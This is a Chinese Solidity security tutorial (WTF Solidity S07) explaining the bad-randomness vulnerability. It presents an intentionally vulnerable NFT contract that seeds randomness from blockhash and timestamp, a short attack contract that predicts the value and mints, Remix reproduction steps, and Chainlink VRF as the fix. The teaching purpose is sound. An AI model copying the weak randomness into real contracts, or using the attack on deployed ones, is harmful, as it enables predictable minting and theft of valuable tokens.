---
title: S07. 坏随机数
tags:
  - solidity
  - security
  - random
---

# WTF Solidity 合约安全: S07. 坏随机数

我最近在重新学 Solidity，巩固一下细节，也写一个“WTF Solidity 合约安全”，供小白们使用（编程大佬可以另找教程），每周更新 1-3 讲。

推特：[@0xAA_Science](https://twitter.com/0xAA_Science)｜[@WTFAcademy_](https://twitter.com/WTFAcademy_)

社区：[Discord](https://discord.gg/5akcruXrsk)｜[微信群](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[官网 wtf.academy](https://wtf.academy)

所有代码和教程开源在 github: [github.com/AmazingAng/WTFSolidity](https://github.com/AmazingAng/WTFSolidity)

---

这一讲，我们将介绍智能合约的坏随机数（Bad Randomness）漏洞和预防方法，这个漏洞经常在 NFT 和 GameFi 中出现，包括 Meebits，Loots，Wolf Game等。

## 伪随机数

很多以太坊上的应用都需要用到随机数，例如`NFT`随机抽取`tokenId`、抽盲盒、`gamefi`战斗中随机分胜负等等。但是由于以太坊上所有数据都是公开透明（`public`）且确定性（`deterministic`）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如`random()`。很多项目方不得不使用链上的伪随机数生成方法，例如 `blockhash()` 和 `keccak256()` 方法。

坏随机数漏洞：攻击者可以事先计算这些伪随机数的结果，从而达到他们想要的目的，例如铸造任何他们想要的稀有`NFT`而非随机抽取。更多的内容可以阅读 [WTF Solidity极简教程 第39讲：伪随机数](https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random)。

![](./img/S07-1.png)

## 坏随机数案例

下面我们学习一个有坏随机数漏洞的 NFT 合约： BadRandomness.sol。

```solidity
contract BadRandomness is ERC721 {
    uint256 totalSupply;

    // 构造函数，初始化NFT合集的名称、代号
    constructor() ERC721("", ""){}

    // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint
    function luckyMint(uint256 luckyNumber) external {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number
        require(randomNumber == luckyNumber, "Better luck next time!");

        _mint(msg.sender, totalSupply); // mint
        totalSupply++;
    }
}
```

它有一个主要的铸造函数 `luckyMint()`，用户调用时输入一个 `0-99` 的数字，如果和链上生成的伪随机数 `randomNumber` 相等，即可铸造幸运 NFT。伪随机数使用 `blockhash` 和 `block.timestamp` 声称。这个漏洞在于用户可以完美预测生成的随机数并铸造NFT。

下面我们写个攻击合约 `Attack.sol`。

```solidity
contract Attack {
    function attackMint(BadRandomness nftAddr) external {
        // 提前计算随机数
        uint256 luckyNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ) % 100;
        // 利用 luckyNumber 攻击
        nftAddr.luckyMint(luckyNumber);
    }
}
```

攻击函数 `attackMint()`中的参数为 `BadRandomness`合约地址。在其中，我们计算了随机数 `luckyNumber`，然后将它作为参数输入到 `luckyMint()` 函数完成攻击。由于`attackMint()`和`luckyMint()`将在同一个区块中调用，`blockhash`和`block.timestamp`是相同的，利用他们生成的随机数也相同。

## `Remix` 复现

由于 Remix 自带的 Remix VM不支持 `blockhash`函数，因此你需要将合约部署到以太坊测试链上进行复现。

1. 部署 `BadRandomness` 合约。

2. 部署 `Attack` 合约。

3. 将 `BadRandomness` 合约地址作为参数传入到 `Attack` 合约的 `attackMint()` 函数并调用，完成攻击。

4. 调用 `BadRandomness` 合约的 `balanceOf` 查看`Attack` 合约NFT余额，确认攻击成功。

## 预防方法

我们通常使用预言机项目提供的链下随机数来预防这类漏洞，例如 Chainlink VRF。这类随机数从链下生成，然后上传到链上，从而保证随机数不可预测。更多介绍可以阅读 [WTF Solidity极简教程 第39讲：伪随机数](https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random)。

## 总结

这一讲我们介绍了坏随机数漏洞，并介绍了一个简单的预防方法：使用预言机项目提供的链下随机数。NFT 和 GameFi 项目方应避免使用链上伪随机数进行抽奖，以防被黑客利用。

